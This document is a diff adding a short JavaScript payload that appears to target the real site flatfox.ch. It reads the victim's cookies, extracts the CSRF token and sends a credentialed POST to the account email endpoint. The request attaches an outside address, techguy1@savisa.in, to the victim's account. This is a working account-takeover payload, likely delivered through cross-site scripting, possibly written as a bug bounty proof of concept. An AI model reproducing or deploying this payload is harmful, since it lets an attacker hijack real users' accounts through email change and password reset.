@@ -1,0 +1,13 @@
+var csrftokencookie = document.cookie;
+var csrftokensplit = csrftokencookie.split("csrftoken=");
+var csrftokensplit1 = csrftokensplit[1].split(";");
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "https://flatfox.ch/en/accounts/email/", true);
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhr.setRequestHeader("Referer", "https://flatfox.ch/en/accounts/email/");
+xhr.setRequestHeader("Origin", "https://flatfox.ch");
+xhr.setRequestHeader("Cookie", document.cookie);
+xhr.setRequestHeader("X-CSRFToken", csrftokensplit1[0]);
+xhr.withCredentials = true;
+var body = "csrfmiddlewaretoken=" + csrftokensplit1[0] + "&email=techguy1@savisa.in&action_add=";
+xhr.send(body);
